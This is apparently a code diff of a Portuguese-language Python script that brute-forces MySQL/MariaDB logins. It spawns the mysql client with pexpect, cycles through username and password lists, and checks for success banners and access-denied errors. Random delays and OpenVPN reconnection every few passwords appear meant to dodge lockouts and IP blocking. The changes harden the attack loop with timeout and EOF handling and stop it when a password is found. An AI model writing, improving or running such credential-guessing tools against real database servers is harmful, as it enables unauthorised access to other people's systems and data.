@@ -11,13 +11,22 @@ openvpn_enter = vpn.openvpn_enter_()
 
 finded = False
 
-j = 0
-
 LOGIN_SUCCESS_MARIADB = 0
 LOGIN_SUCCESS_MYSQL = 1
-LOGIN_DENIED = 2
-END = 3
-TIMEOUT = 4
+ERROR_1698 = 2
+LOGIN_DENIED = 3
+END = 4
+TIMEOUT = 5
+
+
+def expect_state(process, patterns):
+    try:
+        return process.expect(patterns)
+    except pexpect.EOF:
+        return END
+    except pexpect.TIMEOUT:
+        return TIMEOUT
+
 
 i = int(input("Qual o valor inicial do usuário: "))
 j = int(input("Qual o valor inicial da senha: "))
@@ -51,20 +60,30 @@ while i < len(usersl):
 
         process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)
 
-        process.expect("Enter password:")
-        process.sendline(str(passwordsl[j]))
+        result = expect_state(process, ["Enter password:"])
 
-        result = process.expect([
-            "MariaDB",
-            "mysql",
-            "ERROR 1698",
-            pexpect.EOF,
-            pexpect.TIMEOUT,
-        ])
+        if result == 0:
+            try:
+                process.sendline(str(passwordsl[j]))
+            except pexpect.EOF:
+                result = END
+            except pexpect.TIMEOUT:
+                result = TIMEOUT
+
+        if result == 0:
+            result = expect_state(process, [
+                r"Welcome to the MariaDB monitor",
+                r"Welcome to the MySQL monitor",
+                r"ERROR 1698 .*Access denied for user",
+                r"ERROR 1045 .*Access denied for user",
+                pexpect.EOF,
+                pexpect.TIMEOUT,
+            ])
 
         if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
             password = passwordsl[j]
             print(password)
+            process.close()
 
             finded = True
 
@@ -78,7 +97,7 @@ while i < len(usersl):
 
             break
 
-        if result == LOGIN_DENIED:
+        if result in (ERROR_1698, LOGIN_DENIED):
             print("Senha recusada pelo MySQL.")
         elif result == END:
             print("A conexão com o MySQL foi encerrada.")
@@ -92,8 +111,7 @@ while i < len(usersl):
         delay = random.randint(1, 3)
         time.sleep(delay)
 
-
-        if result in (LOGIN_DENIED, END, TIMEOUT):
+        if result in (END, TIMEOUT):
             tries_exceeded += 1
 
             if tries_exceeded >= 15:
@@ -106,12 +124,14 @@ while i < len(usersl):
                     f.writelines(lines)
 
                 print("Muitas tentativas falhadas. Encerrando...")
+                process.close()
                 break
 
             process.close()
             continue
 
         tries_exceeded = 0
+        process.close()
         
         if j >= next5:
             openvpn_enter.close()
@@ -120,9 +140,13 @@ while i < len(usersl):
 
         j += 1
 
-    i += 1
-
     if tries_exceeded >= 15:
         break
+
+    if finded == True:
+        break
+
+    i += 1
+    j = 0
 
 openvpn_enter.close()
